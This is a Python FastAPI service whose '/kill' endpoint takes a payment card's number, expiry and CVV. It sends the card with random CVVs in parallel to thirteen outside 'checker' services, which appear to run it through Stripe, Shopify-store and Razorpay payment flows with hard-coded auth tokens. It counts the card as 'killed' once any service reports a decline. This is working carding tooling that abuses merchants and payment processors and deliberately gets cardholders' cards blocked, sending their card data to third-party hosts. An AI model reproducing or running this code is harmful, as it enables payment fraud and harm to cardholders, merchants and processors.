import random
import traceback
import requests
import fastapi
import time
import asyncio
import aiohttp
from urllib.parse import quote
from api_fastapi import check_card

session = requests.Session()

killed = 0

app = fastapi.FastAPI()

dead_card = {}

from typing import List



@app.get("/kill")
async def kill(cc: str):

    global killed

    num, mm, yy, cvv = cc.split("|")

    result = await kill_card(num, mm, yy, cvv)

    if not result:
        return {
            "card": cc,
            "status": "failed",
            "response": "No Decline Found",
            "message": "No API returned decline.",
            "total_killed": killed
        }

    return result



async def kill_card(num: str, mm: str, yy: str, cvv: str):

    api_template_01 = f'https://stripe360-production.up.railway.app/stripe_1?auth=WTFH4RSH&cc='

    api_template_02 = f'https://stripe360-production.up.railway.app/stripe_2?auth=WTFH4RSH&cc='

    api_template_03 = f'https://stripe360-production.up.railway.app/stripe_3?auth=WTFH4RSH&cc='

    api_template_04 = f'https://autoshopify-production-d008.up.railway.app/shopify?site=https://keyesco.myshopify.com&cc='

    api_template_05 = f'https://haters.cxchk.site/shopii?site=https://keyesco.myshopify.com&cc='

    api_template_06 = f'https://web-production-07260.up.railway.app/razorpay?cc='

    api_template_07 = f'https://stripe360-production.up.railway.app/razorpay?auth=WTFH4RSH&cc='

    api_template_08 = f'https://stripe360-production.up.railway.app/stripe_4?auth=WTFH4RSH&cc='

    api_template_09 = f'https://stripe360-production.up.railway.app/stripe_5?auth=WTFH4RSH&cc='

    api_template_10 = f'https://stripe360-production.up.railway.app/stripe_6?auth=WTFH4RSH&cc='

    api_template_11 = f'https://stripe360-production.up.railway.app/stripe_7?auth=WTFH4RSH&cc='

    api_template_12 = f'https://stripe360-production.up.railway.app/stripe_8?auth=WTFH4RSH&cc='

    api_template_13 = f'https://stripe360-production.up.railway.app/stripe_9?auth=WTFH4RSH&cc='




    global killed

    api_templates = [
        api_template_01,
        api_template_02,
        api_template_03,
        api_template_04,
        api_template_05,
        api_template_06,
        api_template_07,
        api_template_08,
        api_template_09,
        api_template_10,
        api_template_11,
        api_template_12,
        api_template_13
    ]

    original_card = f"{num}|{mm}|{yy}|{cvv}"

    connector = aiohttp.TCPConnector(
        limit=100,
        ttl_dns_cache=300,
        ssl=False
    )

    timeout = aiohttp.ClientTimeout(total=20)

    stop_event = asyncio.Event()
    lock = asyncio.Lock()

    result = None

    async def check_api(session, api_template):

        nonlocal result

        if stop_event.is_set():
            return

        try:
            random_cvv = random.randint(100, 999)

            card_with_cvv = f"{num}|{mm}|{yy}|{random_cvv}"

            api_url = f"{api_template}{quote(card_with_cvv, safe='')}"

            if "razorpay.me" in api_url:
                api_url += "&site=https://razorpay.me/@holidaymoodsadventure&proxy="

            async with session.get(api_url) as response:

                text = await response.text()

                print(f"[{response.status}] {api_url}")

                lowered = text.lower()

                if any(x in lowered for x in [
                    "declined",
                    "card declined",
                    "decline"
                ]):

                    async with lock:

                        global killed

                        if stop_event.is_set():
                            return

                        killed += 1

                        result = {
                            "card": original_card,
                            "status": "success",
                            "response": "Card Declined",
                            "message": "Card has been killed successfully.",
                            "total_killed": killed
                        }

                        print(f"[KILLED] {card_with_cvv}")

                        

        except asyncio.TimeoutError:
            print(f"[TIMEOUT] {api_template}")

        except aiohttp.ClientError as e:
            print(f"[AIOHTTP ERROR] {api_template} -> {e}")

        except Exception:
            print(f"[UNKNOWN ERROR] {api_template}")
            traceback.print_exc()

    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout
    ) as session:

        tasks = [
            asyncio.create_task(check_api(session, api))
            for api in api_templates
        ]

        await asyncio.gather(*tasks)

    if result:
        return result

    return {
        "card": original_card,
        "status": "failed",
        "response": "No Decline Found",
        "message": "No API returned a decline response.",
        "total_killed": killed
        }
    



if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)